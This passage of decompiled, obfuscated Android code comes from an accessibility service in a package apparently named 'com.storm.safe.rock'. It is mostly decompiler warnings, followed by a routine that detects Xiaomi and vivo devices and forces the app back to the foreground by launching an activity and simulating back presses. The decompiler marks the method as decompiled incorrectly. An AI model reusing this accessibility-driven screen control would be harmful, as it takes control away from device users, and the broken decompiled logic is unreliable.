B:75:0x01c1, B:68:0x0165, B:70:0x019a, B:72:0x01b6, B:76:0x01c8, B:78:0x01d0, B:82:0x01e2, B:88:0x01f8, B:94:0x0246, B:93:0x0233, B:90:0x020d), top: B:248:0x0047, inners: #1 }] */
    /* JADX WARN: Removed duplicated region for block: B:179:0x0460 A[PHI: r0 r6 r7 r16 r21
      0x0460: PHI (r0v74 int) = (r0v67 int), (r0v67 int), (r0v75 int) binds: [B:181:0x0473, B:177:0x045c, B:36:0x00ac] A[DONT_GENERATE, DONT_INLINE]
      0x0460: PHI (r6v19 java.lang.String) = (r6v14 java.lang.String), (r6v14 java.lang.String), (r6v21 java.lang.String) binds: [B:181:0x0473, B:177:0x045c, B:36:0x00ac] A[DONT_GENERATE, DONT_INLINE]
      0x0460: PHI (r7v20 com.storm.safe.rock.service.dqtvuisjd) = 
      (r7v15 com.storm.safe.rock.service.dqtvuisjd)
      (r7v15 com.storm.safe.rock.service.dqtvuisjd)
      (r7v25 com.storm.safe.rock.service.dqtvuisjd)
     binds: [B:181:0x0473, B:177:0x045c, B:36:0x00ac] A[DONT_GENERATE, DONT_INLINE]
      0x0460: PHI (r16v18 java.lang.String) = (r16v15 java.lang.String), (r16v15 java.lang.String), (r16v19 java.lang.String) binds: [B:181:0x0473, B:177:0x045c, B:36:0x00ac] A[DONT_GENERATE, DONT_INLINE]
      0x0460: PHI (r21v17 java.lang.String) = (r21v14 java.lang.String), (r21v14 java.lang.String), (r21v18 java.lang.String) binds: [B:181:0x0473, B:177:0x045c, B:36:0x00ac] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:182:0x0475  */
    /* JADX WARN: Removed duplicated region for block: B:185:0x048e A[Catch: Exception -> 0x0059, TryCatch #0 {Exception -> 0x0059, blocks: (B:13:0x0054, B:240:0x05d7, B:242:0x05ee, B:244:0x05fa, B:19:0x0069, B:226:0x057e, B:228:0x0595, B:230:0x05a1, B:234:0x05b5, B:237:0x05c6, B:22:0x0074, B:211:0x051a, B:213:0x0531, B:215:0x053d, B:219:0x0550, B:223:0x056b, B:25:0x007e, B:29:0x0092, B:195:0x04c5, B:197:0x04cb, B:199:0x04d7, B:200:0x04dc, B:204:0x04ef, B:208:0x0506, B:32:0x009f, B:183:0x0477, B:185:0x048e, B:189:0x049d, B:192:0x04b1, B:35:0x00a9, B:39:0x00bf, B:167:0x0422, B:169:0x0428, B:171:0x0434, B:172:0x0439, B:176:0x044c, B:180:0x0463, B:42:0x00ce, B:155:0x03d4, B:157:0x03eb, B:161:0x03fa, B:164:0x040e, B:45:0x00d8, B:48:0x00e9, B:139:0x037f, B:141:0x0385, B:143:0x0391, B:144:0x0396, B:148:0x03a9, B:152:0x03c0, B:51:0x00fa, B:134:0x034f, B:136:0x0366, B:54:0x0104, B:57:0x0117, B:117:0x02f8, B:119:0x02fe, B:121:0x030a, B:123:0x0312, B:127:0x0325, B:131:0x033b, B:62:0x0134, B:98:0x0264, B:100:0x026e, B:102:0x0295, B:104:0x02a1, B:106:0x02c0, B:110:0x02cf, B:114:0x02e5, B:63:0x0141, B:85:0x01ed, B:86:0x01f3, B:64:0x0148, B:81:0x01db, B:65:0x014f, B:75:0x01c1, B:68:0x0165, B:70:0x019a, B:72:0x01b6, B:76:0x01c8, B:78:0x01d0, B:82:0x01e2, B:88:0x01f8, B:94:0x0246, B:93:0x0233, B:90:0x020d), top: B:248:0x0047, inners: #1 }] */
    /* JADX WARN: Removed duplicated region for block: B:197:0x04cb A[Catch: Exception -> 0x0059, TryCatch #0 {Exception -> 0x0059, blocks: (B:13:0x0054, B:240:0x05d7, B:242:0x05ee, B:244:0x05fa, B:19:0x0069, B:226:0x057e, B:228:0x0595, B:230:0x05a1, B:234:0x05b5, B:237:0x05c6, B:22:0x0074, B:211:0x051a, B:213:0x0531, B:215:0x053d, B:219:0x0550, B:223:0x056b, B:25:0x007e, B:29:0x0092, B:195:0x04c5, B:197:0x04cb, B:199:0x04d7, B:200:0x04dc, B:204:0x04ef, B:208:0x0506, B:32:0x009f, B:183:0x0477, B:185:0x048e, B:189:0x049d, B:192:0x04b1, B:35:0x00a9, B:39:0x00bf, B:167:0x0422, B:169:0x0428, B:171:0x0434, B:172:0x0439, B:176:0x044c, B:180:0x0463, B:42:0x00ce, B:155:0x03d4, B:157:0x03eb, B:161:0x03fa, B:164:0x040e, B:45:0x00d8, B:48:0x00e9, B:139:0x037f, B:141:0x0385, B:143:0x0391, B:144:0x0396, B:148:0x03a9, B:152:0x03c0, B:51:0x00fa, B:134:0x034f, B:136:0x0366, B:54:0x0104, B:57:0x0117, B:117:0x02f8, B:119:0x02fe, B:121:0x030a, B:123:0x0312, B:127:0x0325, B:131:0x033b, B:62:0x0134, B:98:0x0264, B:100:0x026e, B:102:0x0295, B:104:0x02a1, B:106:0x02c0, B:110:0x02cf, B:114:0x02e5, B:63:0x0141, B:85:0x01ed, B:86:0x01f3, B:64:0x0148, B:81:0x01db, B:65:0x014f, B:75:0x01c1, B:68:0x0165, B:70:0x019a, B:72:0x01b6, B:76:0x01c8, B:78:0x01d0, B:82:0x01e2, B:88:0x01f8, B:94:0x0246, B:93:0x0233, B:90:0x020d), top: B:248:0x0047, inners: #1 }] */
    /* JADX WARN: Removed duplicated region for block: B:199:0x04d7 A[Catch: Exception -> 0x0059, TryCatch #0 {Exception -> 0x0059, blocks: (B:13:0x0054, B:240:0x05d7, B:242:0x05ee, B:244:0x05fa, B:19:0x0069, B:226:0x057e, B:228:0x0595, B:230:0x05a1, B:234:0x05b5, B:237:0x05c6, B:22:0x0074, B:211:0x051a, B:213:0x0531, B:215:0x053d, B:219:0x0550, B:223:0x056b, B:25:0x007e, B:29:0x0092, B:195:0x04c5, B:197:0x04cb, B:199:0x04d7, B:200:0x04dc, B:204:0x04ef, B:208:0x0506, B:32:0x009f, B:183:0x0477, B:185:0x048e, B:189:0x049d, B:192:0x04b1, B:35:0x00a9, B:39:0x00bf, B:167:0x0422, B:169:0x0428, B:171:0x0434, B:172:0x0439, B:176:0x044c, B:180:0x0463, B:42:0x00ce, B:155:0x03d4, B:157:0x03eb, B:161:0x03fa, B:164:0x040e, B:45:0x00d8, B:48:0x00e9, B:139:0x037f, B:141:0x0385, B:143:0x0391, B:144:0x0396, B:148:0x03a9, B:152:0x03c0, B:51:0x00fa, B:134:0x034f, B:136:0x0366, B:54:0x0104, B:57:0x0117, B:117:0x02f8, B:119:0x02fe, B:121:0x030a, B:123:0x0312, B:127:0x0325, B:131:0x033b, B:62:0x0134, B:98:0x0264, B:100:0x026e, B:102:0x0295, B:104:0x02a1, B:106:0x02c0, B:110:0x02cf, B:114:0x02e5, B:63:0x0141, B:85:0x01ed, B:86:0x01f3, B:64:0x0148, B:81:0x01db, B:65:0x014f, B:75:0x01c1, B:68:0x0165, B:70:0x019a, B:72:0x01b6, B:76:0x01c8, B:78:0x01d0, B:82:0x01e2, B:88:0x01f8, B:94:0x0246, B:93:0x0233, B:90:0x020d), top: B:248:0x0047, inners: #1 }] */
    /* JADX WARN: Removed duplicated region for block: B:200:0x04dc A[Catch: Exception -> 0x0059, PHI: r0 r5 r6 r21
      0x04dc: PHI (r0v78 int) = (r0v74 int), (r0v79 int) binds: [B:184:0x048c, B:199:0x04d7] A[DONT_GENERATE, DONT_INLINE]
      0x04dc: PHI (r5v11 java.lang.String) = (r5v9 java.lang.String), (r5v12 java.lang.String) binds: [B:184:0x048c, B:199:0x04d7] A[DONT_GENERATE, DONT_INLINE]
      0x04dc: PHI (r6v24 com.storm.safe.rock.service.dqtvuisjd) = (r6v20 com.storm.safe.rock.service.dqtvuisjd), (r6v25 com.storm.safe.rock.service.dqtvuisjd) binds: [B:184:0x048c, B:199:0x04d7] A[DONT_GENERATE, DONT_INLINE]
      0x04dc: PHI (r21v19 java.lang.String) = (r21v17 java.lang.String), (r21v20 java.lang.String) binds: [B:184:0x048c, B:199:0x04d7] A[DONT_GENERATE, DONT_INLINE], TryCatch #0 {Exception -> 0x0059, blocks: (B:13:0x0054, B:240:0x05d7, B:242:0x05ee, B:244:0x05fa, B:19:0x0069, B:226:0x057e, B:228:0x0595, B:230:0x05a1, B:234:0x05b5, B:237:0x05c6, B:22:0x0074, B:211:0x051a, B:213:0x0531, B:215:0x053d, B:219:0x0550, B:223:0x056b, B:25:0x007e, B:29:0x0092, B:195:0x04c5, B:197:0x04cb, B:199:0x04d7, B:200:0x04dc, B:204:0x04ef, B:208:0x0506, B:32:0x009f, B:183:0x0477, B:185:0x048e, B:189:0x049d, B:192:0x04b1, B:35:0x00a9, B:39:0x00bf, B:167:0x0422, B:169:0x0428, B:171:0x0434, B:172:0x0439, B:176:0x044c, B:180:0x0463, B:42:0x00ce, B:155:0x03d4, B:157:0x03eb, B:161:0x03fa, B:164:0x040e, B:45:0x00d8, B:48:0x00e9, B:139:0x037f, B:141:0x0385, B:143:0x0391, B:144:0x0396, B:148:0x03a9, B:152:0x03c0, B:51:0x00fa, B:134:0x034f, B:136:0x0366, B:54:0x0104, B:57:0x0117, B:117:0x02f8, B:119:0x02fe, B:121:0x030a, B:123:0x0312, B:127:0x0325, B:131:0x033b, B:62:0x0134, B:98:0x0264, B:100:0x026e, B:102:0x0295, B:104:0x02a1, B:106:0x02c0, B:110:0x02cf, B:114:0x02e5, B:63:0x0141, B:85:0x01ed, B:86:0x01f3, B:64:0x0148, B:81:0x01db, B:65:0x014f, B:75:0x01c1, B:68:0x0165, B:70:0x019a, B:72:0x01b6, B:76:0x01c8, B:78:0x01d0, B:82:0x01e2, B:88:0x01f8, B:94:0x0246, B:93:0x0233, B:90:0x020d), top: B:248:0x0047, inners: #1 }] */
    /* JADX WARN: Removed duplicated region for block: B:207:0x0503 A[PHI: r0 r5 r6 r21
      0x0503: PHI (r0v85 int) = (r0v78 int), (r0v78 int), (r0v88 int) binds: [B:209:0x0516, B:205:0x04ff, B:26:0x0081] A[DONT_GENERATE, DONT_INLINE]
      0x0503: PHI (r5v16 java.lang.String) = (r5v11 java.lang.String), (r5v11 java.lang.String), (r5v18 java.lang.String) binds: [B:209:0x0516, B:205:0x04ff, B:26:0x0081] A[DONT_GENERATE, DONT_INLINE]
      0x0503: PHI (r6v29 com.storm.safe.rock.service.dqtvuisjd) = 
      (r6v24 com.storm.safe.rock.service.dqtvuisjd)
      (r6v24 com.storm.safe.rock.service.dqtvuisjd)
      (r6v38 com.storm.safe.rock.service.dqtvuisjd)
     binds: [B:209:0x0516, B:205:0x04ff, B:26:0x0081] A[DONT_GENERATE, DONT_INLINE]
      0x0503: PHI (r21v22 java.lang.String) = (r21v19 java.lang.String), (r21v19 java.lang.String), (r21v23 java.lang.String) binds: [B:209:0x0516, B:205:0x04ff, B:26:0x0081] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:210:0x0518  */
    /* JADX WARN: Removed duplicated region for block: B:213:0x0531 A[Catch: Exception -> 0x0059, TryCatch #0 {Exception -> 0x0059, blocks: (B:13:0x0054, B:240:0x05d7, B:242:0x05ee, B:244:0x05fa, B:19:0x0069, B:226:0x057e, B:228:0x0595, B:230:0x05a1, B:234:0x05b5, B:237:0x05c6, B:22:0x0074, B:211:0x051a, B:213:0x0531, B:215:0x053d, B:219:0x0550, B:223:0x056b, B:25:0x007e, B:29:0x0092, B:195:0x04c5, B:197:0x04cb, B:199:0x04d7, B:200:0x04dc, B:204:0x04ef, B:208:0x0506, B:32:0x009f, B:183:0x0477, B:185:0x048e, B:189:0x049d, B:192:0x04b1, B:35:0x00a9, B:39:0x00bf, B:167:0x0422, B:169:0x0428, B:171:0x0434, B:172:0x0439, B:176:0x044c, B:180:0x0463, B:42:0x00ce, B:155:0x03d4, B:157:0x03eb, B:161:0x03fa, B:164:0x040e, B:45:0x00d8, B:48:0x00e9, B:139:0x037f, B:141:0x0385, B:143:0x0391, B:144:0x0396, B:148:0x03a9, B:152:0x03c0, B:51:0x00fa, B:134:0x034f, B:136:0x0366, B:54:0x0104, B:57:0x0117, B:117:0x02f8, B:119:0x02fe, B:121:0x030a, B:123:0x0312, B:127:0x0325, B:131:0x033b, B:62:0x0134, B:98:0x0264, B:100:0x026e, B:102:0x0295, B:104:0x02a1, B:106:0x02c0, B:110:0x02cf, B:114:0x02e5, B:63:0x0141, B:85:0x01ed, B:86:0x01f3, B:64:0x0148, B:81:0x01db, B:65:0x014f, B:75:0x01c1, B:68:0x0165, B:70:0x019a, B:72:0x01b6, B:76:0x01c8, B:78:0x01d0, B:82:0x01e2, B:88:0x01f8, B:94:0x0246, B:93:0x0233, B:90:0x020d), top: B:248:0x0047, inners: #1 }] */
    /* JADX WARN: Removed duplicated region for block: B:215:0x053d A[Catch: Exception -> 0x0059, TryCatch #0 {Exception -> 0x0059, blocks: (B:13:0x0054, B:240:0x05d7, B:242:0x05ee, B:244:0x05fa, B:19:0x0069, B:226:0x057e, B:228:0x0595, B:230:0x05a1, B:234:0x05b5, B:237:0x05c6, B:22:0x0074, B:211:0x051a, B:213:0x0531, B:215:0x053d, B:219:0x0550, B:223:0x056b, B:25:0x007e, B:29:0x0092, B:195:0x04c5, B:197:0x04cb, B:199:0x04d7, B:200:0x04dc, B:204:0x04ef, B:208:0x0506, B:32:0x009f, B:183:0x0477, B:185:0x048e, B:189:0x049d, B:192:0x04b1, B:35:0x00a9, B:39:0x00bf, B:167:0x0422, B:169:0x0428, B:171:0x0434, B:172:0x0439, B:176:0x044c, B:180:0x0463, B:42:0x00ce, B:155:0x03d4, B:157:0x03eb, B:161:0x03fa, B:164:0x040e, B:45:0x00d8, B:48:0x00e9, B:139:0x037f, B:141:0x0385, B:143:0x0391, B:144:0x0396, B:148:0x03a9, B:152:0x03c0, B:51:0x00fa, B:134:0x034f, B:136:0x0366, B:54:0x0104, B:57:0x0117, B:117:0x02f8, B:119:0x02fe, B:121:0x030a, B:123:0x0312, B:127:0x0325, B:131:0x033b, B:62:0x0134, B:98:0x0264, B:100:0x026e, B:102:0x0295, B:104:0x02a1, B:106:0x02c0, B:110:0x02cf, B:114:0x02e5, B:63:0x0141, B:85:0x01ed, B:86:0x01f3, B:64:0x0148, B:81:0x01db, B:65:0x014f, B:75:0x01c1, B:68:0x0165, B:70:0x019a, B:72:0x01b6, B:76:0x01c8, B:78:0x01d0, B:82:0x01e2, B:88:0x01f8, B:94:0x0246, B:93:0x0233, B:90:0x020d), top: B:248:0x0047, inners: #1 }] */
    /* JADX WARN: Removed duplicated region for block: B:222:0x0564 A[PHI: r0 r4 r5
      0x0564: PHI (r0v91 int) = (r0v85 int), (r0v85 int), (r0v95 int) binds: [B:224:0x057b, B:220:0x0560, B:19:0x0069] A[DONT_GENERATE, DONT_INLINE]
      0x0564: PHI (r4v76 java.lang.String) = (r4v74 java.lang.String), (r4v74 java.lang.String), (r4v80 java.lang.String) binds: [B:224:0x057b, B:220:0x0560, B:19:0x0069] A[DONT_GENERATE, DONT_INLINE]
      0x0564: PHI (r5v21 com.storm.safe.rock.service.dqtvuisjd) = 
      (r5v17 com.storm.safe.rock.service.dqtvuisjd)
      (r5v17 com.storm.safe.rock.service.dqtvuisjd)
      (r5v24 com.storm.safe.rock.service.dqtvuisjd)
     binds: [B:224:0x057b, B:220:0x0560, B:19:0x0069] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:228:0x0595 A[Catch: Exception -> 0x0059, TryCatch #0 {Exception -> 0x0059, blocks: (B:13:0x0054, B:240:0x05d7, B:242:0x05ee, B:244:0x05fa, B:19:0x0069, B:226:0x057e, B:228:0x0595, B:230:0x05a1, B:234:0x05b5, B:237:0x05c6, B:22:0x0074, B:211:0x051a, B:213:0x0531, B:215:0x053d, B:219:0x0550, B:223:0x056b, B:25:0x007e, B:29:0x0092, B:195:0x04c5, B:197:0x04cb, B:199:0x04d7, B:200:0x04dc, B:204:0x04ef, B:208:0x0506, B:32:0x009f, B:183:0x0477, B:185:0x048e, B:189:0x049d, B:192:0x04b1, B:35:0x00a9, B:39:0x00bf, B:167:0x0422, B:169:0x0428, B:171:0x0434, B:172:0x0439, B:176:0x044c, B:180:0x0463, B:42:0x00ce, B:155:0x03d4, B:157:0x03eb, B:161:0x03fa, B:164:0x040e, B:45:0x00d8, B:48:0x00e9, B:139:0x037f, B:141:0x0385, B:143:0x0391, B:144:0x0396, B:148:0x03a9, B:152:0x03c0, B:51:0x00fa, B:134:0x034f, B:136:0x0366, B:54:0x0104, B:57:0x0117, B:117:0x02f8, B:119:0x02fe, B:121:0x030a, B:123:0x0312, B:127:0x0325, B:131:0x033b, B:62:0x0134, B:98:0x0264, B:100:0x026e, B:102:0x0295, B:104:0x02a1, B:106:0x02c0, B:110:0x02cf, B:114:0x02e5, B:63:0x0141, B:85:0x01ed, B:86:0x01f3, B:64:0x0148, B:81:0x01db, B:65:0x014f, B:75:0x01c1, B:68:0x0165, B:70:0x019a, B:72:0x01b6, B:76:0x01c8, B:78:0x01d0, B:82:0x01e2, B:88:0x01f8, B:94:0x0246, B:93:0x0233, B:90:0x020d), top: B:248:0x0047, inners: #1 }] */
    /* JADX WARN: Removed duplicated region for block: B:230:0x05a1 A[Catch: Exception -> 0x0059, TryCatch #0 {Exception -> 0x0059, blocks: (B:13:0x0054, B:240:0x05d7, B:242:0x05ee, B:244:0x05fa, B:19:0x0069, B:226:0x057e, B:228:0x0595, B:230:0x05a1, B:234:0x05b5, B:237:0x05c6, B:22:0x0074, B:211:0x051a, B:213:0x0531, B:215:0x053d, B:219:0x0550, B:223:0x056b, B:25:0x007e, B:29:0x0092, B:195:0x04c5, B:197:0x04cb, B:199:0x04d7, B:200:0x04dc, B:204:0x04ef, B:208:0x0506, B:32:0x009f, B:183:0x0477, B:185:0x048e, B:189:0x049d, B:192:0x04b1, B:35:0x00a9, B:39:0x00bf, B:167:0x0422, B:169:0x0428, B:171:0x0434, B:172:0x0439, B:176:0x044c, B:180:0x0463, B:42:0x00ce, B:155:0x03d4, B:157:0x03eb, B:161:0x03fa, B:164:0x040e, B:45:0x00d8, B:48:0x00e9, B:139:0x037f, B:141:0x0385, B:143:0x0391, B:144:0x0396, B:148:0x03a9, B:152:0x03c0, B:51:0x00fa, B:134:0x034f, B:136:0x0366, B:54:0x0104, B:57:0x0117, B:117:0x02f8, B:119:0x02fe, B:121:0x030a, B:123:0x0312, B:127:0x0325, B:131:0x033b, B:62:0x0134, B:98:0x0264, B:100:0x026e, B:102:0x0295, B:104:0x02a1, B:106:0x02c0, B:110:0x02cf, B:114:0x02e5, B:63:0x0141, B:85:0x01ed, B:86:0x01f3, B:64:0x0148, B:81:0x01db, B:65:0x014f, B:75:0x01c1, B:68:0x0165, B:70:0x019a, B:72:0x01b6, B:76:0x01c8, B:78:0x01d0, B:82:0x01e2, B:88:0x01f8, B:94:0x0246, B:93:0x0233, B:90:0x020d), top: B:248:0x0047, inners: #1 }] */
    /* JADX WARN: Removed duplicated region for block: B:242:0x05ee A[Catch: Exception -> 0x0059, TryCatch #0 {Exception -> 0x0059, blocks: (B:13:0x0054, B:240:0x05d7, B:242:0x05ee, B:244:0x05fa, B:19:0x0069, B:226:0x057e, B:228:0x0595, B:230:0x05a1, B:234:0x05b5, B:237:0x05c6, B:22:0x0074, B:211:0x051a, B:213:0x0531, B:215:0x053d, B:219:0x0550, B:223:0x056b, B:25:0x007e, B:29:0x0092, B:195:0x04c5, B:197:0x04cb, B:199:0x04d7, B:200:0x04dc, B:204:0x04ef, B:208:0x0506, B:32:0x009f, B:183:0x0477, B:185:0x048e, B:189:0x049d, B:192:0x04b1, B:35:0x00a9, B:39:0x00bf, B:167:0x0422, B:169:0x0428, B:171:0x0434, B:172:0x0439, B:176:0x044c, B:180:0x0463, B:42:0x00ce, B:155:0x03d4, B:157:0x03eb, B:161:0x03fa, B:164:0x040e, B:45:0x00d8, B:48:0x00e9, B:139:0x037f, B:141:0x0385, B:143:0x0391, B:144:0x0396, B:148:0x03a9, B:152:0x03c0, B:51:0x00fa, B:134:0x034f, B:136:0x0366, B:54:0x0104, B:57:0x0117, B:117:0x02f8, B:119:0x02fe, B:121:0x030a, B:123:0x0312, B:127:0x0325, B:131:0x033b, B:62:0x0134, B:98:0x0264, B:100:0x026e, B:102:0x0295, B:104:0x02a1, B:106:0x02c0, B:110:0x02cf, B:114:0x02e5, B:63:0x0141, B:85:0x01ed, B:86:0x01f3, B:64:0x0148, B:81:0x01db, B:65:0x014f, B:75:0x01c1, B:68:0x0165, B:70:0x019a, B:72:0x01b6, B:76:0x01c8, B:78:0x01d0, B:82:0x01e2, B:88:0x01f8, B:94:0x0246, B:93:0x0233, B:90:0x020d), top: B:248:0x0047, inners: #1 }] */
    /* JADX WARN: Removed duplicated region for block: B:244:0x05fa A[Catch: Exception -> 0x0059, TRY_LEAVE, TryCatch #0 {Exception -> 0x0059, blocks: (B:13:0x0054, B:240:0x05d7, B:242:0x05ee, B:244:0x05fa, B:19:0x0069, B:226:0x057e, B:228:0x0595, B:230:0x05a1, B:234:0x05b5, B:237:0x05c6, B:22:0x0074, B:211:0x051a, B:213:0x0531, B:215:0x053d, B:219:0x0550, B:223:0x056b, B:25:0x007e, B:29:0x0092, B:195:0x04c5, B:197:0x04cb, B:199:0x04d7, B:200:0x04dc, B:204:0x04ef, B:208:0x0506, B:32:0x009f, B:183:0x0477, B:185:0x048e, B:189:0x049d, B:192:0x04b1, B:35:0x00a9, B:39:0x00bf, B:167:0x0422, B:169:0x0428, B:171:0x0434, B:172:0x0439, B:176:0x044c, B:180:0x0463, B:42:0x00ce, B:155:0x03d4, B:157:0x03eb, B:161:0x03fa, B:164:0x040e, B:45:0x00d8, B:48:0x00e9, B:139:0x037f, B:141:0x0385, B:143:0x0391, B:144:0x0396, B:148:0x03a9, B:152:0x03c0, B:51:0x00fa, B:134:0x034f, B:136:0x0366, B:54:0x0104, B:57:0x0117, B:117:0x02f8, B:119:0x02fe, B:121:0x030a, B:123:0x0312, B:127:0x0325, B:131:0x033b, B:62:0x0134, B:98:0x0264, B:100:0x026e, B:102:0x0295, B:104:0x02a1, B:106:0x02c0, B:110:0x02cf, B:114:0x02e5, B:63:0x0141, B:85:0x01ed, B:86:0x01f3, B:64:0x0148, B:81:0x01db, B:65:0x014f, B:75:0x01c1, B:68:0x0165, B:70:0x019a, B:72:0x01b6, B:76:0x01c8, B:78:0x01d0, B:82:0x01e2, B:88:0x01f8, B:94:0x0246, B:93:0x0233, B:90:0x020d), top: B:248:0x0047, inners: #1 }] */
    /* JADX WARN: Removed duplicated region for block: B:7:0x0030  */
    /* renamed from: m1 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m211524m1(ContinuationImpl continuationImpl) throws Throwable {
        dqtvuisjd$smartReturnToApp$1 dqtvuisjd_smartreturntoapp_1;
        String str;
        String str2;
        long jCurrentTimeMillis;
        String str3;
        String lowerCase;
        String str4;
        dqtvuisjd dqtvuisjdVar;
        long j;
        String str5;
        int i;
        Object objM211525m2;
        Object objM211526m3;
        Object objM211525m22;
        boolean zBooleanValue;
        boolean zM211483h7;
        String str6;
        dqtvuisjd dqtvuisjdVar2;
        String str7;
        dqtvuisjd dqtvuisjdVar3;
        boolean zM211483h72;
        String str8;
        dqtvuisjd dqtvuisjdVar4;
        boolean zM211483h73;
        String str9;
        dqtvuisjd dqtvuisjdVar5;
        boolean zM211483h74;
        String str10;
        dqtvuisjd dqtvuisjdVar6;
        boolean zM211483h75;
        dqtvuisjd dqtvuisjdVar7;
        boolean zM211483h76;
        boolean zM211483h77;
        if (continuationImpl instanceof dqtvuisjd$smartReturnToApp$1) {
            dqtvuisjd_smartreturntoapp_1 = (dqtvuisjd$smartReturnToApp$1) continuationImpl;
            int i2 = dqtvuisjd_smartreturntoapp_1.f52690a6;
            if ((i2 & Integer.MIN_VALUE) != 0) {
                dqtvuisjd_smartreturntoapp_1.f52690a6 = i2 - Integer.MIN_VALUE;
            } else {
                dqtvuisjd_smartreturntoapp_1 = new dqtvuisjd$smartReturnToApp$1(this, continuationImpl);
            }
        }
        Object obj = dqtvuisjd_smartreturntoapp_1.f52688a4;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        try {
            switch (dqtvuisjd_smartreturntoapp_1.f52690a6) {
                case 0:
                    kg1.m213544f4(obj);
                    str = "✅ [导航] 第五次检测：第四次返回后是否在应用 = ";
                    str2 = "✅ [导航] 第四次检测：第三次返回后是否在应用 = ";
                    jCurrentTimeMillis = System.currentTimeMillis();
                    t60.m214714d6("dqtvuisjd", "🏠 [smartReturnToApp] 开始执行...");
                    String str11 = Build.BRAND;
                    str3 = "✅ [导航] 第三次检测：第二次返回后是否在应用 = ";
                    t60.m214694b5(str11, "BRAND");
                    lowerCase = str11.toLowerCase(Locale.ROOT);
                    t60.m214694b5(lowerCase, "this as java.lang.String).toLowerCase(Locale.ROOT)");
                    str4 = "✅ [导航] 第二次检测：第一次返回后是否在应用 = ";
                    int i3 = Build.VERSION.SDK_INT;
                    t60.m214714d6("dqtvuisjd", "🏠 [smartReturnToApp] brand=" + lowerCase + ", SDK=" + i3);
                    String strM211427e0 = m211427e0();
                    if (strM211427e0 != null) {
                        t60.m214714d6("dqtvuisjd", "✅ [设备] 检测到小米" + strM211427e0 + "设备，使用特殊返回策略");
                        if (strM211427e0.equals("Android 10")) {
                            dqtvuisjd_smartreturntoapp_1.f52690a6 = 1;
                            objM211525m22 = m211525m2(dqtvuisjd_smartreturntoapp_1);
                            if (objM211525m22 == coroutineSingletons) {
                            }
                            zBooleanValue = ((Boolean) objM211525m22).booleanValue();
                            return t60.m214689a7(zBooleanValue);
                        }
                        if (t60.m214686a2(strM211427e0, "Android 13")) {
                            dqtvuisjd_smartreturntoapp_1.f52690a6 = 2;
                            objM211526m3 = m211526m3(dqtvuisjd_smartreturntoapp_1);
                            if (objM211526m3 == coroutineSingletons) {
                            }
                            zBooleanValue = ((Boolean) objM211526m3).booleanValue();
                            return t60.m214689a7(zBooleanValue);
                        }
                        dqtvuisjd_smartreturntoapp_1.f52690a6 = 3;
                        objM211525m2 = m211525m2(dqtvuisjd_smartreturntoapp_1);
                        if (objM211525m2 == coroutineSingletons) {
                        }
                        zBooleanValue = ((Boolean) objM211525m2).booleanValue();
                        return t60.m214689a7(zBooleanValue);
                    }
                    String strM211428e1 = m211428e1();
                    t60.m214714d6("dqtvuisjd", "🏠 [smartReturnToApp] vivoSpecialDevice=" + strM211428e1);
                    if (strM211428e1 == null) {
                        try {
                            t60.m214714d6("dqtvuisjd", "🏠 [smartReturnToApp] 启动iuzxujjtqev...");
                            Intent intent = new Intent(this, (Class<?>) iuzxujjtqev.class);
                            intent.addFlags(872415232);
                            intent.putExtra("SMART_RETURN_BACKUP", true);
                            intent.putExtra("FROM_ACCESSIBILITY_SERVICE", true);
                            startActivity(intent);
                            t60.m214714d6("dqtvuisjd", "🏠 [smartReturnToApp] iuzxujjtqev已启动");
                        } catch (Exception e) {
                            t60.m214705c6("dqtvuisjd", "❌ [服务] 启动Activity失败: " + e.getMessage(), e);
                        }
                        t60.m214714d6("dqtvuisjd", "🏠 [smartReturnToApp] 等待2000ms...");
                        dqtvuisjd_smartreturntoapp_1.f52684a0 = this;
                        dqtvuisjd_smartreturntoapp_1.f52685a1 = lowerCase;
                        dqtvuisjd_smartreturntoapp_1.f52686a2 = jCurrentTimeMillis;
                        dqtvuisjd_smartreturntoapp_1.f52687a3 = i3;
                        dqtvuisjd_smartreturntoapp_1.f52690a6 = 4;
                        if (b81.m210571b1(2000L, dqtvuisjd_smartreturntoapp_1) != coroutineSingletons) {
                            dqtvuisjdVar = this;
                            j = jCurrentTimeMillis;
                            str5 = lowerCase;
                            i = i3;
                            t60.m214714d6("dqtvuisjd", "🏠 [smartReturnToApp] 等待完成");
                            jCurrentTimeMillis = j;
                            lowerCase = str5;
                            zM211483h7 = dqtvuisjdVar.m211483h7();
                            t60.m214714d6("dqtvuisjd", "🏠 [smartReturnToApp] 启动Activity后检测: 在app=" + zM211483h7 + ", 耗时=" + (System.currentTimeMillis() - jCurrentTimeMillis) + "ms");
                            if (zM211483h7) {
                                t60.m214714d6("dqtvuisjd", "✅ [导航] 简单方案跳回应用成功");
                                return t60.m214689a7(true);
                            }
                            t60.m214704c5("dqtvuisjd", "❌ [导航] 简单方案失败，启用返回键策略");
                            t60.m214714d6("dqtvuisjd", "✅ [导航] 开始智能返回应用流程（最多4次返回操作）");
                            boolean zM211483h78 = dqtvuisjdVar.m211483h7();
                            t60.m214714d6("dqtvuisjd", "✅ [导航] 第一次检测：当前是否在应用 = " + zM211483h78);
                            if (zM211483h78) {
                                t60.m214714d6("dqtvuisjd", "✅ [导航] 已经在应用页面，但仍进行稳定性验证");
                                if (AbstractC0779a1.m213656a9(lowerCase, "vivo") && i == 31) {
                                    dqtvuisjd_smartreturntoapp_1.f52684a0 = dqtvuisjdVar;
                                    dqtvuisjd_smartreturntoapp_1.f52685a1 = lowerCase;
                                    dqtvuisjd_smartreturntoapp_1.f52687a3 = i;
                                    dqtvuisjd_smartreturntoapp_1.f52690a6 = 5;
                                    if (b81.m210571b1(1000L, dqtvuisjd_smartreturntoapp_1) == coroutineSingletons) {
                                    }
                                    str6 = lowerCase;
                                    dqtvuisjdVar2 = dqtvuisjdVar;
                                } else {
                                    dqtvuisjd_smartreturntoapp_1.f52684a0 = dqtvuisjdVar;
                                    dqtvuisjd_smartreturntoapp_1.f52685a1 = lowerCase;
                                    dqtvuisjd_smartreturntoapp_1.f52687a3 = i;
                                    dqtvuisjd_smartreturntoapp_1.f52690a6 = 6;
                                    if (b81.m210571b1(500L, dqtvuisjd_smartreturntoapp_1) == coroutineSingletons) {
                                    }
                                    str6 = lowerCase;
